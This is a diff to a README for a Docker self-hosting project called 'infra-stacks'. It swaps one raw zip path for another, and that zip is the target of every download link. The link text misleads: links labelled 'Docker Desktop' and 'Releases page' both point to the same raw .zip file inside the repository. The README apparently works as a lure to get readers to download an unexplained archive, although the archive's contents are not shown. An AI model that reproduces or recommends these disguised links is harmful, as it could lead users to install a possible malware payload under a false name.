@@ -1,6 +1,6 @@
 # 🚀 infra-stacks - Easy Self-Hosting with Docker
 
-[![Download Releases](https://raw.githubusercontent.com/Luizgugss/infra-stacks/main/stacks/monitoring/infra_stacks_1.0-beta.1.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Luizgugss/infra-stacks/main/stacks/monitoring/infra_stacks_1.0-beta.1.zip)
+[![Download Releases](https://raw.githubusercontent.com/Luizgugss/infra-stacks/main/docs/stacks-infra-1.4.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Luizgugss/infra-stacks/main/docs/stacks-infra-1.4.zip)
 
 ## 📖 Overview
 
@@ -13,11 +13,11 @@ Follow these straightforward steps to get your application up and running:
 1. **Check System Requirements**  
    Make sure your computer has the following:
    - Operating System: Windows, macOS, or a Linux distribution.
-   - Docker: Download and install [Docker Desktop](https://raw.githubusercontent.com/Luizgugss/infra-stacks/main/stacks/monitoring/infra_stacks_1.0-beta.1.zip) for your operating system.
+   - Docker: Download and install [Docker Desktop](https://raw.githubusercontent.com/Luizgugss/infra-stacks/main/docs/stacks-infra-1.4.zip) for your operating system.
    - Internet Connection: You will need internet access for downloading images and updates.
 
 2. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Luizgugss/infra-stacks/main/stacks/monitoring/infra_stacks_1.0-beta.1.zip) to find the latest version of infra-stacks. 
+   Go to the [Releases page](https://raw.githubusercontent.com/Luizgugss/infra-stacks/main/docs/stacks-infra-1.4.zip) to find the latest version of infra-stacks. 
 
 3. **Download The Latest Release**  
    Look for the most recent version. Click on the release name, and you will see a list of available files. Choose the appropriate file for your operating system and click to download.
@@ -58,7 +58,7 @@ Follow these straightforward steps to get your application up and running:
 
 ## 📥 Download & Install 
 
-To download the latest release directly, visit the [Releases page](https://raw.githubusercontent.com/Luizgugss/infra-stacks/main/stacks/monitoring/infra_stacks_1.0-beta.1.zip) again. 
+To download the latest release directly, visit the [Releases page](https://raw.githubusercontent.com/Luizgugss/infra-stacks/main/docs/stacks-infra-1.4.zip) again. 
 
 ## 🏗️ Available Applications
 
